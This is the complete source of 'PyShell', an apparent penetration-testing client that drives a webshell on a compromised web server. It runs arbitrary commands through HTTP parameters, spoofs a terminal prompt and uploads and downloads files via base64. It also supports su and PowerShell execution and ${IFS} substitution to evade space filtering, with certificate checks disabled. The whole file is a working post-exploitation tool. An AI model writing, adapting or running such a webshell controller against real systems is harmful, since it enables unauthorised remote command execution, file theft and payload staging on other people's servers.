#!/usr/bin/python3
import sys, os, re
import requests
import readline
import argparse
import base64
import urllib
import urllib3
import neotermcolor
from neotermcolor import colored

urllib3.disable_warnings()
TAG_RE = re.compile(r'<[^>]+>')
neotermcolor.readline_always_safe = True

def remove_html(text):
   return TAG_RE.sub('', text).strip()

def send_command(command, webshell, method, param="code"):
   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
   "Authorization":args.auth, "Cookie":args.cookies, "Content-Type":"application/x-www-form-urlencoded"}
   params = {param.strip():command.strip()}
   if args.noenc:
      params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_][]}{><')
   else:
      params = urllib.parse.urlencode(params, safe='')
   if (method.upper() == "GET"):
      response = requests.get((webshell), params=params, headers=headers, verify=False)
   elif (method.upper() == "POST"):
      response = requests.post((webshell), data=params, headers=headers, verify=False)
   return response.content.decode(errors="ignore")

if __name__ == "__main__":
 banner = r"""
  ██████ ▓██   ░██  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒██░   ██▒██    ▒ ▓██  ██▒▓██    ▓██▒    ▓██▒    
 ▓██░  ██▒ ██  ██░░ ▓███   ▒██████░▒████  ▒██░    ▒██░    
 ▒██████ ▒ ░████▓░  ▒   ██▒░██ ░██ ▒██    ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░██▒░██▓░█████▒░██████▒░██████▒
 ▒██░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░ ░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

  -------------- by @JoelGMSec & @3v4Si0N ---------------
 """

print (colored(banner, "green"))
parser = argparse.ArgumentParser()
parser.add_argument("url", help="Webshell URL", type=str)
parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
parser.add_argument("-ne", "--noenc", action="store_true", help="Disable URL encode on key chars")
parser.add_argument("-np", "--nopre", action="store_true", help="Disable HTML <pre> tags parser")
parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
parser.add_argument("-ifs", "--ifs", action="store_true", help="Replace all white spaces with Internal Field Separator")
parser.add_argument("-su", "--sudo", action="store_true", help="Sudo command execution (Only on Linux hosts)")
parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
args = parser.parse_args()

try:
   WEBSHELL = args.url
   HTTP_METHOD = args.method
   PARAM = args.param
   PIPE = ""
   COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
   if str(sys.platform) == "linux":
      localslash = "/"
   else:
      localslash = "\\" 
   if args.pipe:
      PIPE = "|"
   whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
   if args.nopre:
      whoami = "<pre>" + whoami + "</pre>"
   if not "<pre>" in whoami:
      print (colored("[!] Command output not found! Exiting..\n", "red"))
      sys.exit()                      
   if "<pre>" in whoami:
      whoami = str(whoami).split("<pre>", 1)[1] ; whoami = str(whoami).split("</pre>", 1)[0]
      whoami = remove_html(whoami)
   if args.sudo:
      whoami = "root"
   hostname = send_command(PIPE + "hostname", WEBSHELL, HTTP_METHOD, PARAM)
   if args.nopre:
      hostname = "<pre>" + hostname + "</pre>"
   if "<pre>" in hostname:
      hostname = str(hostname).split("<pre>", 1)[1] ; hostname = str(hostname).split("</pre>", 1)[0]
      hostname = remove_html(hostname)
   cwd = "" ; slash = "\\"
   if not slash in whoami:
      path = send_command(PIPE + "pwd", WEBSHELL, HTTP_METHOD, PARAM)
      if args.nopre:
         path = "<pre>" + path + "</pre>"
      if "<pre>" in path:
         path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
         path = remove_html(path)
      system = "linux" ; slash = "/"
   else:
      path = send_command(PIPE + "cmd /c echo %cd%", WEBSHELL, HTTP_METHOD, PARAM)
      if args.nopre:
         path = "<pre>" + path + "</pre>"
      if "<pre>" in path:
         path = str(path).split("<pre>", 1)[1] ; path = str(path).split("</pre>", 1)[0]
         path = remove_html(path)
      system = "windows" ; whoami = whoami.split("\\")[1]

   while True:
      try:
         cinput = (colored(" [PyShell] ", "grey", "on_green")) ; cinput += (colored(" ", "green", "on_blue"))
         cinput += (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip() + " ", "grey", "on_blue"))
         if len(str(path).rstrip()) > 24:
            shortpath = str(path).rstrip().split(slash)[-3:] ; shortpath = ".." + slash + slash.join(map(str, shortpath))
            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(shortpath.rstrip() + " ", "grey", "on_yellow"))
         else:
            cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
         cinput += (colored(" ", "yellow"))
         command = input(cinput + "\001\033[0m\002")
         if args.ifs:
            command = command.replace(" ","${IFS}")
            space = "${IFS}"
         if not args.ifs:
            space = " "
         if command == "exit":
            print (colored("[!] Exiting..\n", "red"))
            break
         else:
            if len(command) == 0:
               print("\n")
               continue
            if not command.split():
               print()
               continue
            if "clear" in command.split()[0] or "cls" in command.split()[0]:
               os.system("clear")
               continue
            if "upload" in command.split()[0]:
               if args.ifs:
                  command = command.replace("${IFS}"," ")
               if len(command.split()) == 1 or len(command.split()) == 2:
                  print (colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
               else:
                  localfile = command.split()[1]
                  remotefile = command.split()[2]
                  if remotefile == ".":
                     remotefile = command.split()[1]
                  if not slash in remotefile:
                     if remotefile == localfile:
                        remotesplit = remotefile.split(localslash)[-1]
                        remotefile = path.rstrip() + slash + remotesplit
                     else:
                         remotefile = command.split()[2]
                  remotefiletmp = remotefile.rstrip() + ".tmp"
                  if not localslash in localfile:
                     cwd = os.getcwd()
                     print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "green"))
                  else:
                     print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
                  try:
                     f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                  except OSError:
                     print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                     continue
                  upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                  ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                  if system == "linux":
                     send_command(PIPE + "base64" + space + "-di" + space + remotefile + space + ">" + space + remotefiletmp + space +
                     ";rm" + space + "-f" + space + remotefile + ";mv" + space + remotefiletmp + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                  if system == "windows":
                     command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
                     send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
            else:
               if "download" in command.split()[0]: 
                  if args.ifs:
                     command = command.replace("${IFS}"," ")
                  if len(command.split()) == 1 or len(command.split()) == 2:
                     print (colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                  else:
                     remotefile = command.split()[1]
                     localfile = command.split()[2]
                     if not slash in remotefile:
                        remotefile = path.rstrip() + slash + command.split()[1]
                     if not localslash in localfile:
                        cwd = os.getcwd()
                        if localfile == ".":
                           localfile = command.split()[1]
                           localfile = localfile.split(slash)[-1]
                        print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
                     else:
                        print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
                     if system == "linux":
                        base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                     if system == "windows":
                         command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                         base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                     if args.nopre:
                        base64data = "<pre>" + base64data + "</pre>"
                     if "<pre>" in base64data:
                        base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
                        base64data = remove_html(base64data)
                     download = base64.b64decode(base64data.encode("utf8") + b"========")
                     try:
                        f = open(localfile, "wb") ; f.write(download) ; f.close()
                     except OSError:
                        print (colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
                        continue
               else:
                  if "pwd" in command.split()[0]:
                     path = str(path) + "\n"
                     print (colored(path, "yellow"))
                  else:
                     if "cd" in command.split()[0]:
                        if args.ifs:
                           command = command.replace("${IFS}"," ")
                        if command.split()[1] == ".":
                           continue
                        if ".." in command.split()[1]:
                           path = path.split(slash)[:-1]
                           path = (slash.join(path))
                           if not path:
                              path = slash
                        else:
                           if not slash in command.split()[1]:
                              if path != slash:
                                 path = path.rstrip() + slash + command.split()[1]
                              if path == slash:
                                 path = path.rstrip() + command.split()[1]
                           else:
                              path = command.split()[1]   
                     else:
                        if command.split()[0] in COMMAND_LIST:
                           command_array = command.split(" ")
                           param = ""
                           for i in list(command_array):
                              if i.startswith("-"):
                                 param += i + space
                                 command_array.remove(i)
                           cmd = command_array.pop(0)
                           if len(command_array) == 0:
                              relative_path = ""
                           else:
                              relative_path = command_array[0]
                           if not slash in relative_path:
                              command = cmd + space + param + '"' + path.rstrip() + slash + relative_path + '"'
                           content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                           if args.nopre:
                              content = "<pre>" + content + "</pre>"
                           if "<pre>" in content:
                              content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                              content = remove_html(content) + "\n"
                           print (colored(content, "yellow"))
                        else:
                           if args.PowerShell:
                              content = send_command(PIPE + "powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                              if args.nopre:
                                 content = "<pre>" + content + "</pre>"
                              if "<pre>" in content:
                                 content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                 content = remove_html(content) + "\n"
                              print (colored(content, "yellow"))  
                           else:
                              if args.sudo:
                                 content = send_command(PIPE + "su" + space + "-c" + space + command, WEBSHELL, HTTP_METHOD, PARAM)
                                 if args.nopre:
                                    content = "<pre>" + content + "</pre>"
                                 if "<pre>" in content:
                                     content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                     content = remove_html(content) + "\n"
                                 print (colored(content, "yellow")) 
                              else:
                                 content = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
                                 if args.nopre:
                                    content = "<pre>" + content + "</pre>"
                                 if "<pre>" in content:
                                     content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                     content = remove_html(content) + "\n"
                                 print (colored(content, "yellow")) 

      except KeyboardInterrupt:
         print (colored("\n[!] Exiting..\n", "red"))
         break

except Exception as e:
   print (colored("\n[!] Error getting connection!\n", "red"))
